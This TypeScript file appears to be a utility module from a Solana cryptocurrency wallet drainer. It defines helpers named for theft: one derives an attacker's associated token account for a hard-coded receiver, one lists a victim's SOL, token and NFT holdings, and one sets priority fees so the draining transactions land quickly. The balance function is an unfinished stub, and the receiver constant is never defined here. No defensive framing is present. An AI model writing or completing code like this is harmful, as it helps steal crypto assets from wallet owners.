// processors/solana/utils.ts

import { Connection, PublicKey, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddressSync } from '@solana/spl-token';

export const connection = new Connection(process.env.SOLANA_RPC!);

// Get recent blockhash
export async function getRecentBlockhash() {
  const { blockhash } = await connection.getLatestBlockhash('confirmed');
  return blockhash;
}

// Create attacker's Associated Token Account (ATA)
export function getAttackerATA(mint: PublicKey): PublicKey {
  return getAssociatedTokenAddressSync(mint, new PublicKey(RECEIVERS.SOLANA));
}

// Priority fee instruction (makes tx land faster)
export function getPriorityFeeIx(microLamports = 5000) {
  return ComputeBudgetProgram.setComputeUnitPrice({ 
    microLamports 
  });
}

// Balance fetching utility
export async function getVictimBalances(conn: Connection, pubkey: PublicKey) {
  // Returns SOL balance + token accounts + NFTs
  const solBalance = await conn.getBalance(pubkey);
  
  // ... fetch token accounts and NFTs using getParsedProgramAccounts, Metaplex, etc.
  
  return { solBalance, tokens: [], nfts: [] };
}